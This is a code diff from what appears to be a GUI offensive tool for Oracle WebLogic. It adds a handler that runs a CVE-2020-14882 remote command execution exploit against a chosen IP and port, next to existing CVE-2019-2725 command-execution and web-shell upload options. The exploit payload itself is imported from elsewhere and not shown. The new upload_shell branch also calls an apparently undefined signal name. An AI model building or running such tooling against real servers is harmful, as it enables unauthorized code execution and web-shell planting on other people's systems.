@@ -1,5 +1,6 @@
 from PyQt5.Qt import QThread,pyqtSignal
 import requests
+from plugins.weblogic.CVE202014882 import CVE202014882
 
 class Weblogic_Exe(QThread):
     str_signal = pyqtSignal([str,str])
@@ -152,6 +153,14 @@ xmlns:asy="http://www.bea.com/async/AsyncResponseService">
             self.str_signal[str, str].emit('[-] 12.1.3 payload 执行失败：', 'red')
 
 
+    def CVE202014882(self):
+        poc = CVE202014882(self.ip,self.port,self.cmd).run()
+        if poc:
+            self.str_signal[str, str].emit('[+] 执行完毕...', 'green')
+        else:
+            self.str_signal[str, str].emit('[-] CVE-2020-14882 漏洞不存在', 'red')
+
+
 
 
     def run(self):
@@ -159,3 +168,7 @@ xmlns:asy="http://www.bea.com/async/AsyncResponseService">
             self.CVE20192725()
         if self.bug == "CVE-2019-2725" and self.activity == "upload_shell":
             self.CVE20192725_upload_shell()
+        if self.bug == "CVE-2020-14882" and self.activity == "cmd_exe":
+            self.CVE202014882()
+        if self.bug == "CVE-2020-14882" and self.activity == "upload_shell":
+            self.signal[str, str].emit('[-] 暂不支持', 'red')
